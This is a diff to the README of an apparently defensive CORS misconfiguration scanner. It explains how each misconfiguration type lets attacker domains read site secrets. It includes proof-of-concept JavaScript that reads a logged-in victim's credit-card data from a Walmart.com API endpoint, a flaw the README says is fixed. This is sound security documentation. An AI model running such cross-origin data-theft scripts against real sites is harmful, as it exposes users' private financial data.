@@ -69,11 +69,11 @@ This tool covers the following misconfiguration types:
 
 Misconfiguration type    | Description
 ------------------------ | --------------------------
-Reflect_any_origin       | Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses
-Prefix_match             | `wwww.example.com` trusts `example.com.evil.com`
-Suffix_match             | `wwww.example.com` trusts `evilexample.com`
-Not_escape_dot           | `wwww.example.com` trusts `wwwaexample.com`
-Substring match          | `wwww.example.com` trusts `example.co`
+Reflect_any_origin       | Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses, which means any website can read its secrets by sending cross-orign requests.
+Prefix_match             | `wwww.example.com` trusts `example.com.evil.com`, which is an attacker's domain.
+Suffix_match             | `wwww.example.com` trusts `evilexample.com`, which could be registered by an attacker.
+Not_escape_dot           | `wwww.example.com` trusts `wwwaexample.com`, which could be registered by an attacker.
+Substring match          | `wwww.example.com` trusts `example.co`, which could be registered by an attacker.
 Trust_null               | `wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts
 HTTPS_trust_HTTP         | Risky trust dependency, a MITM attacker may steal HTTPS site secrets
 Trust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its secrets
@@ -81,7 +81,7 @@ Trust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its
  Welcome to contribute more.
 
 ## Exploitation examples
-Here is an example about how to exploit "Reflect_any_origin" misconfiguration on Walmart.com. Note that the vulnerability has been fixed.
+Here is an example about how to exploit "Reflect_any_origin" misconfiguration on Walmart.com(fixed). Secrets on walmart.com can be read by any malicious website(in the demo we use localhost as the malicious website).
 
 Walmart.com video on Youtube:
 
@@ -90,7 +90,7 @@ Walmart.com video on Youtube:
 Here is the exploitation code:
 ```javascript
 <script>
-    // Send a cross origin request to target website server, and read victim's private data
+    // Send a cross origin request to the walmart.com server, when a victim visits the page.
     var req = new XMLHttpRequest();
     req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
     req.onload = stealData;
@@ -98,10 +98,10 @@ Here is the exploitation code:
     req.send();
 
     function stealData(){
-        //read the response, and extract the data
+        //reading response is allowed because of the CORS misconfiguration.
         var data= JSON.stringify(JSON.parse(this.responseText),null,2);
 
-        //display it on the page. A real attacker can send the data to his server.
+        //display the data on the page. A real attacker can send the data to his server.
         output(data);
     }
 
